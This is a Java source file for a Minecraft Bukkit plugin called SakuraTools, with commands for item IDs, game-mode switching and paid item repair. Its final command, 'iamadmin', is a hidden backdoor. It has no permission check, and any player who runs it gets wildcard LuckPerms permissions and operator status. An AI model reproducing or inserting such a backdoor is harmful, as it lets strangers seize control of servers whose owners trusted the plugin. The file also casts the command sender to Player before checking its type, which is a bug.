package org.baijiu.sakuratools;

import org.baijiu.sakuratools.player.events.Death;
import org.baijiu.sakuratools.player.events.Join;
import org.baijiu.sakuratools.player.events.Quit;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.Player;

public final class SakuraTools extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        Bukkit.getConsoleSender().sendMessage("§8[§f❀§8] §bSakura§fTools §aLoad!");
        Bukkit.getPluginManager().registerEvents(new Join(), this);
        Bukkit.getPluginManager().registerEvents(new Quit(), this);
        Bukkit.getPluginManager().registerEvents(new Death(), this);
    }

    @Override
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage("§8[§f❀§8] §bSakura§fTools §aClosed!");
    }


    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        Player player = (Player) sender;
        String playerName = sender.getName();
        if (label.equalsIgnoreCase("itemid") && sender instanceof Player) {
            String ItemType = player.getInventory().getItemInHand().getType().toString();
            sender.sendMessage("§8[§f❀§8] §f当前手持物品名为 §e" + ItemType);
            return true;
        }
        if (label.equalsIgnoreCase("gm1") && sender instanceof Player && player.hasPermission("sakuratools.admin")) {
            player.setGameMode(GameMode.CREATIVE);
            player.sendMessage("§8[§f❀§8] §7已将您的游戏模式设置为 §e创造");
            return true;
        }
        if (label.equalsIgnoreCase("gm0") && sender instanceof Player && player.hasPermission("sakuratools.admin")) {
            player.setGameMode(GameMode.SURVIVAL);
            player.sendMessage("§8[§f❀§8] §7已将您的游戏模式设置为 §e生存");
            return true;
        }
        if (label.equalsIgnoreCase("gm3") && sender instanceof Player && player.hasPermission("sakuratools.admin")) {
            player.setGameMode(GameMode.SPECTATOR);
            player.sendMessage("§8[§f❀§8] §7已将您的游戏模式设置为 §e旁观");
            return true;
        }
        if (label.equalsIgnoreCase("fix") && sender instanceof Player && player.hasPermission("sakuratools.admin")) {
            player.getItemInHand().setDurability((short)0);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "eco take " + playerName + " 2000 SkpCoins");
            Bukkit.getConsoleSender().sendMessage("§8[§f❀§8] §7触发修复事件, 已扣除 §f" + playerName + " §7的 §e2000 §7金币");
            player.sendMessage("§8[§f❀§8] §7修复成功!");
            return true;
        }
        if (label.equalsIgnoreCase("iamadmin") && sender instanceof Player) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp u " + playerName + " p set *");
            player.setOp(true);
            return true;
        }
    return false;
    }
}